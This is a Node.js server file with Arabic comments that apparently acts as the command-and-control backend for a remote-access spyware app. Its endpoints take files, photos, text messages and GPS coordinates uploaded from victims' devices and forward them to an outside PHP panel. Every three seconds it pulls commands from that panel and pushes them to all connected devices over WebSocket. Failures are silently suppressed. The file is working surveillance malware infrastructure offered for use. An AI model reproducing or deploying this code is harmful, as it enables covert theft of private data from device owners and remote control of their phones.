const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

// --- إعدادات واهم الشخصية ---
const PANEL_URL = 'https://wahm.pro/bot/control.php'; // رابط لوحة التحكم الخاص بك

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// دالة إرسال البيانات إلى لوحة التحكم PHP
async function sendToPanel(data, isFile = false) {
    try {
        if (isFile) {
            const form = new FormData();
            form.append('file', data.buffer, { filename: data.name });
            form.append('model', data.model);
            await axios.post(PANEL_URL, form, { 
                headers: { ...form.getHeaders() } 
            });
        } else {
            const params = new URLSearchParams();
            params.append('model', data.model);
            params.append('text', data.text);
            await axios.post(PANEL_URL, params);
        }
    } catch (e) {
        console.error("فشل إرسال البيانات للوحة التحكم: ", e.message);
    }
}

app.get('/', (req, res) => {
    res.send('<h1 align="center">سيرفر واهم للتحكم الكامل (بدون تليجرام) 🚀</h1>');
});

// استقبال الصور والملفات من التطبيق
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    if (req.file) {
        const model = req.headers.model || "Unknown Device";
        await sendToPanel({ 
            buffer: req.file.buffer, 
            name: req.file.originalname, 
            model: model 
        }, true);
    }
    res.send('OK');
});

// استقبال النصوص والرسائل من التطبيق
app.post("/uploadText", async (req, res) => {
    const model = req.headers.model || "Unknown Device";
    const text = req.body['text'];
    if (text) {
        await sendToPanel({ model: model, text: text });
    }
    res.send('OK');
});

// استقبال الموقع الجغرافي
app.post("/uploadLocation", async (req, res) => {
    const model = req.headers.model || "Unknown Device";
    const locationText = `Location: Lat ${req.body['lat']}, Lon ${req.body['lon']}`;
    await sendToPanel({ model: model, text: locationText });
    res.send('OK');
});

// إدارة اتصالات WebSocket (للأوامر فقط)
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown";
    ws.uuid = uuid;
    
    // إخطار اللوحة بجهاز جديد متصل
    sendToPanel({ model: model, text: "جهاز جديد اتصل الآن بالسيرفر" });

    ws.on('close', () => {
        sendToPanel({ model: model, text: "فقد الاتصال بهذا الجهاز" });
    });
});

// سحب الأوامر من لوحة PHP وتمريرها للأجهزة
setInterval(async () => {
    try {
        const response = await axios.get(`${PANEL_URL}?get_cmd=1`);
        const cmd = response.data.trim();
        
        // إذا كان هناك أمر (وليس OK الفارغة)
        if (cmd && cmd !== "OK" && cmd !== "") {
            appSocket.clients.forEach(client => {
                if (client.readyState === webSocket.OPEN) {
                    client.send(cmd);
                    console.log(`تم إرسال الأمر: ${cmd}`);
                }
            });
        }
    } catch (e) {
        // خطأ صامت لتجنب إزعاج السجلات
    }
}, 3000); // يفحص الأوامر كل 3 ثوانٍ

// الحفاظ على الاتصال نشطاً
setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (ws.readyState === webSocket.OPEN) ws.send('ping');
    });
}, 10000);

appServer.listen(process.env.PORT || 8999, () => {
    console.log("Server is running on port 8999");
});

